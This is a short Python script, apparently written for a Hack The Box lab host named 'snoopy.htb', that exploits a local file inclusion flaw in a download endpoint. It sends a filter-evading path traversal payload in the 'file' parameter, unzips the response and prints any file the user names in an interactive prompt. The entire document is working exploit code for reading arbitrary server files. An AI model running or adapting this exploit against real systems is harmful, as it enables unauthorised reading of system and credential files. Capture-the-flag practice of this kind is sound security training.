import requests
from colorama import Fore, Style
import zipfile


def lfi(path):
    try:
        #cookies 
    
        url ="http://provisions.snoopy.htb/download"
        params = {"file":f"....//....//....//....//....//....//....//....//....//....//....//..../{path}"}
        r= requests.get(url,params=params)
        if(r.status_code == 200):
            with open('ejemplo.zip', 'wb') as f:
                f.write(r.content)
            
            with zipfile.ZipFile('ejemplo.zip', 'r') as zip_ref:
                zip_ref.extractall('.')
            
            with open(f'press_package{path}', 'r') as f:
                content = f.read()
                print(Fore.GREEN + f"{content}" + Style.RESET_ALL)
 
        else:
            print(Fore.RED + f"{path} not found." + Style.RESET_ALL)
            
    except zipfile.BadZipFile:
        print(Fore.RED + f"{path} not found." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"LFI Error : {e}" + Style.RESET_ALL)


def main():
    while True:
        path  = input(Fore.BLUE + "[+] file >> " + Style.RESET_ALL)
        lfi(path)

if __name__ == "__main__":
    main()